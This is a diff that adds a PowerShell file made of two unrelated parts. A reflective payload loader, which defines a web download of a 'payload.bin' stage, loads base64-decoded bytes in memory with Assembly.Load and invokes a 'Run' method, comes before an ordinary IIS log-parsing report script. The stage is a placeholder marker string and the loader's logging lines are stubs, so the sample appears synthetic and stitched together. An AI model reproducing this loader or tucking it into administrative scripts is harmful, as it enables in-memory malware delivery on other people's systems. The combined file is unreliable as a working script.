@@ -1,0 +1,162 @@
+
+<#
+.SYNOPSIS
+    Managed assembly acquisition and reflection workflow.
+
+.DESCRIPTION
+    Downloads or decodes a managed payload stage, loads it into the
+    current AppDomain, then looks for a conventional entry method
+    and invokes it only when present.
+
+.NOTES
+    The loader expects a managed payload stage.
+
+.EXAMPLE
+    PS> .\loader.ps1
+#>
+[CmdletBinding()]
+param(
+    [string]$RemoteUrl = "https://internal.corp/payload.bin",
+    [string]$TracePath = "$env:TEMP\report.txt",
+    [int]$TimeoutSec = 180
+)
+$ErrorActionPreference = "Stop"
+
+# Acquisition
+function Get-StageAssemblyBytes {
+    param(
+        [string]$SourceUrl = "",
+        [int]$TimeoutSec = 180
+    )
+
+    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
+    $ClientObject = New-Object System.Net.WebClient
+    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
+    return $ClientObject.DownloadData($SourceUrl)
+}
+
+# Reflection
+function Invoke-AssemblyEntryPoint {
+    param(
+        [object]$LoadedAssembly = $null
+    )
+
+    if ($null -eq $LoadedAssembly) {
+        throw "Loaded assembly is null"
+    }
+    $Types = $LoadedAssembly.GetTypes()
+    if ($Types.Length -gt 0) {
+        $EntryMethod = $Types[0].GetMethod("Run")
+        if ($null -ne $EntryMethod) {
+            Write-Verbose "Invoking entry method"
+            return $EntryMethod.Invoke($null, @())
+        }
+    }
+    Write-Verbose "No conventional entry method found"
+    return $null
+}
+
+try {
+    Write-Verbose "Starting managed loader"
+    $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp6b2Q1cTFiaDB1")
+    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
+    $FetchResult = [Reflection.Assembly]::Load($StageBytes)
+    $EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $FetchResult
+    Write-Verbose ("Entry result: " + $EntryResult)
+}
+catch {
+    Write-Warning "Managed loader failed: $($_.Exception.Message)"
+}
+
+$AssemblyReport = [ordered]@{
+    Stage = "reflection"
+    ByteCount = $StageBytes.Length
+    Endpoint = $RemoteUrl
+}
+$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
+Write-Verbose "Collecting host metadata"
+Write-Verbose "Resolving configured target"
+Write-Verbose "Writing diagnostic marker"
+Write-Verbose "Retry budget remaining"
+Write-Verbose "Applying operation timeout"
+Write-Verbose "Validating result"
+Write-Verbose "Inspecting process list"
+Write-Verbose "Operation completed"
+$StageMarker = "stage-37"
+<#
+.SYNOPSIS
+    Parses IIS W3C logs and reports the busiest URLs and status codes.
+.DESCRIPTION
+    Reads the newest log files below the configured site folder, discovers the
+    field order from the #Fields header and aggregates requests, errors and
+    transferred bytes.
+    The output is a CSV file that can be opened in Excel or forwarded to the web
+    operations mailbox.
+.PARAMETER LogRoot
+    Defaults to the value configured for this host.
+.EXAMPLE
+    .\Get-IisTopUrls.ps1 -Days 30 -TopN 5
+#>
+
+$LogRoot = 'C:\inetpub\logs\LogFiles\W3SVC7'
+$Days = 30
+$TopN = 5
+$OutputPath = "C:\Reports\iis-top-2026-08-28.csv"
+$HtmlPath = "C:\Reports\iis-2026-08-28.html"
+
+$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
+$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
+
+$cutoff = (Get-Date).AddDays(-$Days)
+$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
+    Where-Object { $_.LastWriteTime -ge $cutoff }
+if (@($logFiles).Count -eq 0) {
+    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
+}
+
+$entries = foreach ($log in $logFiles) {
+    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
+        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
+    if (-not $fieldLine) {
+        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
+        continue
+    }
+    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
+    $statusIndex = [array]::IndexOf($columns, 'sc-status')
+    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
+    $methodIndex = [array]::IndexOf($columns, 'cs-method')
+    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
+    $timeIndex = [array]::IndexOf($columns, 'time-taken')
+    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
+        $parts = $_ -split ' '
+        if ($parts.Count -lt $columns.Count) {
+            return
+        }
+        [pscustomobject]@{
+            Date      = $parts[0]
+            Time      = $parts[1]
+            Method    = $parts[$methodIndex]
+            Uri       = $parts[$uriIndex]
+            Status    = [int]$parts[$statusIndex]
+            Bytes     = [int]$parts[$bytesIndex]
+            TimeTaken = [int]$parts[$timeIndex]
+        }
+    }
+}
+
+$totalRequests = @($entries).Count
+$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
+$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
+$topUrls = $entries |
+    Group-Object -Property Uri |
+    Sort-Object -Property Count -Descending |
+    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
+$byStatus = $entries |
+    Group-Object -Property Status |
+    Sort-Object -Property Count -Descending |
+    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count
+
+$topUrls | Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
+
+Write-Host ("Requests: {0} | Errors: {1} | Traffic: {2} MB" -f $totalRequests, @($errorEntries).Count, $totalMB) -ForegroundColor Cyan
+$byStatus | Format-Table -AutoSize
